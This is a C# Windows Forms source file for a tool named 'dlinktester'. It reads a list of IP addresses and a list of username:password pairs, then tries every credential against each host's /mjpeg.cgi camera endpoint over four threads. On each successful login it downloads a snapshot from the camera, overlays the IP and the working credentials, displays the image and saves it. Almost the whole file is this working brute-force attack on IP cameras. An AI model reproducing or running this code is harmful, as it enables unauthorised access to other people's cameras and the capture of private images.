using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace dlinktester
{
    public partial class Form1 : Form
    {
        public string[] IPs;
        public string[] Userlist;
        public string ipsFileName;
        public string passlistFileName;
        public int counter;
        public int iplen;
        public string directory = System.Reflection.Assembly.GetEntryAssembly().Location + @"\";

        public Form1()
        {
            InitializeComponent();
        }

        public class MyWebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                var req = base.GetWebRequest(address);
                req.Timeout = 5000;
                return req;
            }
        }

        public void testThread(string[] IPs, string[] Userlist)
        {
            //begin testing
            for (int i = 0; i < IPs.Length; i++)
            {
                this.Invoke(new MethodInvoker(delegate ()
                {
                    counter++;
                    label1.Text = (counter + " / " + iplen);
                }));
                for (int o = 0; o < Userlist.Length; o++)
                {
                    using (MyWebClient client = new MyWebClient())
                    {
                        string currentip = IPs[i];
                        if (currentip.EndsWith(":"))
                        {
                            currentip = currentip.Remove(currentip.Length - 1);
                        }
                        Bitmap b;
                        string[] currentcreds = Userlist[o].Split(':');
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + currentip + "/mjpeg.cgi");
                        request.Method = "GET";
                        request.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
                        request.Timeout = 2000;
                        Console.WriteLine(currentcreds[0] + " : " + currentcreds[1]);
                        try
                        {
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                            if (response.StatusCode == HttpStatusCode.OK)
                            {
                                Console.WriteLine("GOT 200");
                                client.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
                                try
                                {
                                    byte[] image = client.DownloadData("http://" + currentip + "/image.jpg");
                                    using (var ms = new MemoryStream(image))
                                    {
                                        b = new Bitmap(ms);
                                    }
                                    using (Graphics graphics = Graphics.FromImage(b))
                                    {
                                        PointF firstLocation = new PointF(10f, 10f);
                                        PointF secondLocation = new PointF(10f, 24f);
                                        Font lucFont = new Font("Lucida Console", 10);
                                        PointF Pointvar = new PointF(10f, 10f);
                                        PointF Pointvar2 = new PointF(10f, 24f);
                                        SizeF size = graphics.MeasureString(currentip, lucFont);
                                        SizeF size2 = graphics.MeasureString(currentcreds[0] + " : " + currentcreds[1], lucFont);
                                        RectangleF rect = new RectangleF(Pointvar, size);
                                        RectangleF rect2 = new RectangleF(Pointvar2, size2);
                                        graphics.FillRectangle(Brushes.Black, rect);
                                        graphics.FillRectangle(Brushes.Black, rect2);
                                        graphics.DrawString(currentip, lucFont, Brushes.White, firstLocation);
                                        graphics.DrawString(currentcreds[0] + " : " + currentcreds[1], lucFont, Brushes.White, secondLocation);
                                        graphics.Dispose();
                                    }
                                    this.Invoke(new MethodInvoker(delegate ()
                                    {
                                        listBox1.Items.Add(currentip);
                                        pictureBox1.Image = new Bitmap(b);
                                    }));
                                    Random random = new Random();
                                    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                                    string rand = new string(Enumerable.Repeat(chars, 5).Select(s => s[random.Next(s.Length)]).ToArray());
                                    b.Save(directory + rand + ".jpg", ImageFormat.Jpeg);
                                    b.Dispose();
                                    break;
                                }
                                catch
                                {
                                    break;
                                }

                            }
                            else
                            {
                                //Console.WriteLine((int)response.StatusCode);
                            }
                        }
                        catch(Exception ex)
                        {
                            Console.WriteLine(ex);
                        }

                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open IP file";
                dlg.Filter = "Text files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    ipsFileName = dlg.FileName;
                    IPs = System.IO.File.ReadAllLines(ipsFileName).ToArray();
                    iplen = IPs.Length;
                    label1.Text = ("0 / " + iplen);
                    button1.ForeColor = Color.Green;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open Passlist file";
                dlg.Filter = "Text files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    passlistFileName = dlg.FileName;
                    Userlist = System.IO.File.ReadAllLines(passlistFileName).ToArray();
                    button2.ForeColor = Color.Green;
                }
            }
        }

        public static int GetNextInt32(RNGCryptoServiceProvider rnd)
        {
            byte[] randomInt = new byte[4];
            rnd.GetBytes(randomInt);
            return Convert.ToInt32(randomInt[0]);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            button1.Enabled = false;
            button2.Enabled = false;
            button3.Enabled = false;
            button4.Enabled = false;
            checkBox1.Enabled = false;

            if (checkBox1.Checked)
            {
                RNGCryptoServiceProvider rnd2 = new RNGCryptoServiceProvider(); //may be overdoing it a little
                string[] IPs2 = IPs.OrderBy(x => GetNextInt32(rnd2)).ToArray();
                IPs = IPs2;
            }

            string[] Ofirstsplit = IPs.Take(IPs.Length / 2).ToArray();
            string[] Osecondsplit = IPs.Skip(IPs.Length / 2).ToArray();

            string[] firstsplit = Ofirstsplit.Take(Ofirstsplit.Length / 2).ToArray();
            string[] secondsplit = Ofirstsplit.Skip(Ofirstsplit.Length / 2).ToArray();
            string[] thirdsplit = Osecondsplit.Take(Osecondsplit.Length / 2).ToArray();
            string[] forthsplit = Osecondsplit.Skip(Osecondsplit.Length / 2).ToArray();

            Thread a = new Thread(() => testThread(firstsplit, Userlist));
            Thread b = new Thread(() => testThread(secondsplit, Userlist));
            Thread c = new Thread(() => testThread(thirdsplit, Userlist));
            Thread d = new Thread(() => testThread(forthsplit, Userlist));
            a.IsBackground = true;
            b.IsBackground = true;
            c.IsBackground = true;
            d.IsBackground = true;
            a.Start();
            b.Start();
            c.Start();
            d.Start();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (var fbd = new FolderBrowserDialog())
            {
                DialogResult result = fbd.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(fbd.SelectedPath))
                {
                    directory = fbd.SelectedPath + @"\";
                    button4.ForeColor = System.Drawing.Color.Green;
                }
            }
        }
    }
}
